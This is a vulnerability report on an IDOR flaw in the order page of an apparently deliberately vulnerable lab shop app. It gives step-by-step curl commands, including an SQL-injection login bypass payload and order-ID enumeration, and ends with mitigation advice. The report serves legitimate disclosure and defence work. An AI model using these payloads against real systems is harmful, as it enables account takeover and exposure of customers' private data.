# Vulnerability Report: Insecure Direct Object Reference (IDOR) on Order Details

## 1. Vulnerability Type
Insecure Direct Object Reference (IDOR)

## 2. Location
Order Details Page (`/order?id=...`)

## 3. Description
The VULN SHOP application exhibits an Insecure Direct Object Reference (IDOR) vulnerability on its order details page. Authenticated users can access order information by providing an `id` parameter in the URL (e.g., `/order?id=1`). The application fails to implement proper authorization checks to ensure that the logged-in user is authorized to view the requested order. This allows an attacker to bypass access controls and view the order details of other users by simply incrementing or changing the `order_id` in the URL.

The presence of the HTML comment `(This is sensitive info exposed via IDOR)` directly in the source code of the order details page explicitly confirms this vulnerability.

## 4. Proof of Concept (PoC)

### Step 1: Log in to the application
An attacker first needs to be authenticated. This can be achieved through legitimate credentials or, as previously demonstrated, via an SQL Injection authentication bypass.

**Login (example using SQL Injection bypass and curl):**
```bash
export TARGET="http://192.168.0.28:3000"
export MY_IP="10.0.0.103"
curl -X POST -H "X-Forwarded-For: $MY_IP" \
-d "username=admin' OR '1'='1&password=admin' OR '1'='1" \
-c cookies.txt \
$TARGET/login
```
This saves session cookies to `cookies.txt`.

### Step 2: Access the Order History Page
Navigate to the order history page and identify a valid order ID.
**Request:**
```bash
curl -b cookies.txt -H "X-Forwarded-For: $MY_IP" $TARGET/order
```
The response will show a link to order details, e.g., `<a href="/order?id=1" ...>VIEW DETAILS</a>`.

### Step 3: Manipulate the `id` parameter
With the session cookies, attempt to access order details for a different `id` than the one displayed or expected to belong to the authenticated user.

**Request (example to view order with `id=2`):**
```bash
curl -b cookies.txt -H "X-Forwarded-For: $MY_IP" "$TARGET/order?id=2"
```

### Step 4: Observe Unauthorized Access
If the application displays the details for order `id=2` (or any other arbitrary ID) without presenting an authorization error or denying access, the IDOR vulnerability is confirmed. The content for `id=1` itself shows:
```html
<div style="margin-top: 30px; padding: 20px; background-color: #f9f9f9; font-size: 0.9rem;">
    <strong>SHIPPING TO:</strong><br>
    User ID: 1<br>
        (This is sensitive info exposed via IDOR)
</div>
```
This explicit comment confirms the vulnerability. By iterating through `id` values, an attacker can enumerate and view all orders in the system.

## 5. Impact
A successful IDOR attack can lead to:
-   **Unauthorized Data Access:** Viewing sensitive order information of other users, including product details, total costs, and potentially shipping addresses and customer User IDs.
-   **Privacy Breach:** Exposure of personal information of other customers.
-   **Business Logic Bypass:** In some cases, IDORs can be chained with other vulnerabilities to modify data or perform actions on behalf of other users.

## 6. Suggested Mitigation
To prevent IDOR vulnerabilities, implement robust server-side authorization checks:
-   **Strict Authorization:** For every request that accesses a resource via a direct object reference (like an `id`), the server must verify that the authenticated user is explicitly authorized to access *that specific instance* of the resource. Do not rely solely on obfuscation or client-side controls.
-   **Ownership Verification:** Before retrieving and displaying order details for a given `id`, verify that the `order_id` belongs to the currently logged-in user.
-   **Random/Opaque Identifiers:** Consider using random, unpredictable, and non-sequential identifiers (e.g., UUIDs) for sensitive objects instead of easily guessable sequential integers. This makes enumeration more difficult, though it doesn't replace the need for strong authorization.
-   **Session-based Object Retrieval:** Retrieve objects based on the user's session and associated data, rather than directly from user-supplied IDs. For example, if a user is logged in, only query for orders associated with their user ID directly from the session.
